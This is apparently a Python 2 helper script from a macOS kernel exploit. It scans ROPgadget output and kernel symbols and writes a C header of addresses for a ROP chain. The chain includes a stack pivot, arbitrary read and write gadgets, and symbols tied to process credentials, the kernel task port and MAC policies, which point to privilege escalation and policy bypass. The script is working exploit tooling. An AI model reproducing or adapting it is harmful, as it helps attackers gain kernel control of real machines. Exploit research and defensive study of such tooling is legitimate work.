import os
import sys

def read_file_lines(filename):
  if not os.path.exists(filename):
    return None
  fd = open(filename, "r")
  lines = fd.readlines()
  fd.close()
  return lines

def read_gadget_file(filename):
  lines = read_file_lines(filename)
  gadgets = {}
  for line in lines:
    if not line.startswith("0x"):
      continue # Skip header/footer lines

    parts = line.strip().split(":")
    if len(parts) == 2:
      gadgets[parts[1].strip()] = int(parts[0].strip(), 16)
  return gadgets

def read_symbol_file(filename):
  lines = read_file_lines(filename)
  symbols = {}
  for line in lines:
    parts = line.strip().split()
    if len(parts) == 3:
      symbols[parts[2]] = int(parts[0], 16)
  return symbols

if len(sys.argv) < 2:
  print "Usage: python create_kernel_info.py kernel.gadgets kernel.sym"
  print ""
  print "  Create the kernel.gadgets and kernel.sym files with:"
  print "  kernel.gadgets:  ROPgadget --depth 20 --all --binary /System/Library/Kernels/kernel > kernel.gadgets"
  print "  kernel.sym:      nm /System/Library/Kernels/kernel > kernel.sym"
  print ""
  sys.exit(1)

gadgets = read_gadget_file(sys.argv[1])
symbols = read_symbol_file(sys.argv[2])

needed_gadgets = {
  "POP_RAX"                      : "pop rax ; ret",
  "POP_RCX"                      : "pop rcx ; ret",
  "POP_RDI"                      : "pop rdi ; ret",
  "POP_RSI"                      : "pop rsi ; ret",
  "POP_RDX"                      : "pop rdx ; ret",
  "POP_R8_POP_RBP"               : "pop r8 ; pop rbp ; ret",
  "MOV_RDI_RAX_CALL_RCX"         : "mov rdi, rax ; call rcx",
  "MOV_PTR_RAX_0_POP_RBP_RET"    : "mov qword ptr [rax + 8], 0 ; pop rbp ; ret",
  "MOV_RDI_RAX_POP_RBP_JMP_RCX"  : "mov rdi, rax ; pop rbp ; jmp rcx",
  "MOV_RAX_MEM_RDI_POP_RBP_RET"  : "mov rax, qword ptr [rdi] ; pop rbp ; ret",
  "MOV_MEM_RDI_RAX_POP_RBP_RET"  : "mov qword ptr [rdi], rax ; pop rbp ; ret",
  "ADD_RSP_0x20_POP_RBP"         : "add rsp, 0x20 ; pop rbp ; ret",
  "ADD_RSP_0x160_POP_RBP_RET"    : "add rsp, 0x160 ; pop rbp ; ret",
  "MOV_RDX_RAX_POP_RBP_JMP_RCX"  : "mov rdx, rax ; pop rbp ; jmp rcx",
  "MOV_RSI_RAX_POP_RBP_JMP_RCX"  : "mov rsi, rax ; pop rbp ; jmp rcx",

  # These gadgets (and the ROP chain) may need to be customized per kernel
  "MOV_R9_MEM_RBP_0x40_CALL_RAX" : "mov r9, qword ptr [rbp - 0x40] ; call rax", # MOV_R9_RBP_OFFSET needs to be set to match the offset in this gadget
  "STACK_PIVOT"                  : "push rax ; sub byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x41] ; pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret"
}

needed_symbols = {
  "current_proc",
  "proc_ucred",
  "posix_cred_get",
  "bzero",
  "thread_exception_return",
  "kernel_task",
  "kernel_map",
  "zone_map",
  "mach_vm_remap",
  "realhost",
  "mach_vm_wire_external",
  "ipc_kobject_set",
  "ipc_space_kernel",
  "ipc_port_alloc_special",
  "ipc_port_make_send",
  "kalloc_canblock",
  "mac_policy_list",
}

# Initial header line
print "#pragma once"
print "//Autogenerated kernel gadget and symbol file"

# Print out the gadgets
print "\n//Gadgets:"
for name, gadget in needed_gadgets.items():
  if gadget not in gadgets:
    print "Cannot find gadget {}".format(gadget)
    sys.exit(1)
  print "#define {:30} 0x{:x}ULL //{}".format(name, gadgets[gadget], gadget)
print ""
print "#define MOV_R9_RBP_OFFSET -0x40        // offset in the MOV_R9_MEM_RBP_0x40_CALL_RAX gadget"

# Print out the symbols
print "\n//Symbols:"
for name in needed_symbols:
  sym_name = "_" + name
  if sym_name not in symbols:
    print "Cannot find symbol {}".format(name)
    sys.exit(1)
  print "#define {:30} 0x{:x}ULL".format(name.upper(), symbols[sym_name])

